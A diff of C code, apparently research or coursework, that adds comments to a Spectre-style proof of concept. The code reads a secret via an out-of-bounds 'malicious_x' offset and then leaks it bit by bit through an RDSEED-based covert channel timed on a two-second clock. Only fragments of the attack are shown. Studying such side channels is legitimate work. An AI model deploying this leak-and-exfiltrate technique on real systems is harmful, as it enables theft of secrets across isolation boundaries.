@@ -112,17 +112,19 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 void rng_send(char * msg) {
     // send the data contained in the array 'msg' through the rng conditioner
-    int len = strnlen(msg, 255);
-    int i, j, k, ret;
-    int x;
-    unsigned long long p;
-    struct timespec tp;
+
+    int len = strnlen(msg, 255); // find out the length of our message
+    int i, j, k, ret;            // temporary data
+    int x;                       // used to serialize our bytes
+    unsigned long long p;        // placeholder for rdseed data
+    struct timespec tp;          // time struct for synchronization
 
     for (i = 0; i < len; i++) {
-        x = 0x80;
+        x = 0x80;                // set it to 128d (8th bit)
         for (j = 0; j < 8; j++) {
             // do the rdseed or don't
             while (0 < 1) {
+                // do something every 2 seconds - we could speed it up later
                 clock_gettime(CLOCK_REALTIME, &tp);
                 if (tp.tv_sec % 2 == 0) {
                     if (((msg[i] & x) >> (7 - j)) == 1) {
@@ -140,6 +142,7 @@ void rng_send(char * msg) {
                     }
                 }
             }
+            // move on to the next bit
             x /= 2;
         }
         printf("\n");
@@ -148,9 +151,9 @@ void rng_send(char * msg) {
 
 int main(int argc, const char ** argv) {
     /* Basically, we want to create an empty buffer that's the same size
-    that we can write our results to. From there, we read the actual bytes 
-    of the secret and add them to the buffer we made. */  
-    
+    that we can write our results to. From there, we read the actual bytes
+    of the secret and add them to the buffer we made. */
+
     size_t malicious_x =
         (size_t) (secret - (char *) array1); /* default for malicious_x */
     long unsigned int i;
@@ -174,6 +177,7 @@ int main(int argc, const char ** argv) {
         possible_secret[39-len] = value[0];
     }
 
+    // print out the data we're sending and then send it
     printf("%s\n", possible_secret);
     rng_send(possible_secret);
     return(0);
